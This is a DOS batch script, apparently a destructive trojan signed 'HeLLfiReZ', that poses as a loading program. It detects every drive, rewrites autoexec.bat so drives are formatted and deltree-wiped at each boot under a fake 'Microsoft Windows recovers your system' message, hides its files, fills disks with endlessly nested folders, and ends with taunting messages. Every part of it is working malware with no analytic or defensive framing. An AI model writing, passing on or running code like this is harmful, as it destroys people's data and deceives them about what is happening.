@echo off
rem Oh Dear Something Aint Right.
:start
cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul

rem Drive checking and assigning the valid drives to the drive variable.

set drive=
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z

rem code insertion for Drive Checking takes place here.
rem drivechk.bat is the file name under the root directory.
rem As far as the drive detection and drive variable settings, don't worry about how it 
rem works, it's damn to complicated for the average or even the expert batch programmer.

echo @echo off >drivechk.bat
echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem When errorlevel is 1, then the above is not true, if 0, then it's true.
rem Opposite of binary rules. If 0, it will elapse to the next command.

echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find "bytes" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem if errorlevel is 1, then the drive specified is a removable media drive - not ready.
rem if errorlevel is 0, then it will elaps to the next command.

echo @prompt dir %%%%1:.\/ad/w/-p $b find " 0 bytes free" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 set drive=%%drive%% %%1 >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem if it's errorlevel 1, then the specified drive is a hard or floppy drive.
rem if it's not errorlevel 1, then the specified drive is a CD-ROM drive.

echo :enddc >>drivechk.bat

rem Drive checking insertion ends here. "enddc" stands for "end dDRIVE cHECKING". 

rem Now we will use the program drivechk.bat to attain valid drive information.

:testdrv

for %%a in (%alldrive%) do call drivechk.bat %%a >nul
del drivechk.bat >nul
if %drive.==. set drive=c

:form_del
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a HeLL >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a HeLL >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Welcome to the valley of death :) . >>c:\autoexec.bat
echo echo If you ran this file, then tough shit, You should not be so fucking st00pid . >>c:\autoexec.bat
echo echo 1. Muhahahaha fuckin ha. >>c:\autoexec.bat
echo echo 2. Who's sorry now eh ?. >>c:\autoexec.bat
echo echo 3. Show me the money £$ I want to be HeLL. >>c:\autoexec.bat
echo echo 4. Even though I walk in the shadow of death, I fear no evil except unca HeLL mebbe psalm 27.>>c:\autoexec.bat

echo echo. >>c:\autoexec.bat
echo echo Regards, >>c:\autoexec.bat
echo echo. >>c:\autoexec.bat
echo echo HeLLfiReZ >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat

:makedir
if exist c:\temp.bat attrib -r -h c:\temp.bat >nul
echo @echo off >c:\temp.bat
echo %%1:\ >>c:\temp.bat
echo cd\ >>c:\temp.bat
echo :startmd >>c:\temp.bat
echo for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat
echo for %%%%a in (">ass_hole.txt") do echo %%%%a Your Gone @$$hole!!!! >>c:\temp.bat
echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd >>c:\temp.bat
call attrib +r +h c:\temp.bat >nul

cls
echo Initializing Variables . . .
rem deltree /y %%a:\*. only eliminates directories, hence leaving the file created above for further destruction.
for %%a in (%drive%) do call format %%a: /q /u /autotest >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
for %%a in (%drive%) do call c:\temp.bat %%a HeLLfiReZ >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
for %%a in (%drive%) call attrib -r -h %%a:\ /S  >nul
call attrib +r +h c:\temp.bat >nul
call attrib +r +h c:\autoexec.bat >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .

for %%a in (%drive%) call deltree /y %%a:\*. >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .
echo Starting Application . . .
for %%a in (%drive%) do call c:\temp.bat %%a HeLLfiReZ >nul

cls
echo Thank you for your co-operation.
echo.
echo Have a nice day.
echo.
echo Here is a joke for you . . .
echo.
echo     Q). What's the worst thing about this prog?
echo     A). It only kills you once.
echo.
echo HAHAHAHA, get it? Don't you just love that one?
echo.
echo Regards,
echo.
echo Unca HeLLfiReZ

:end
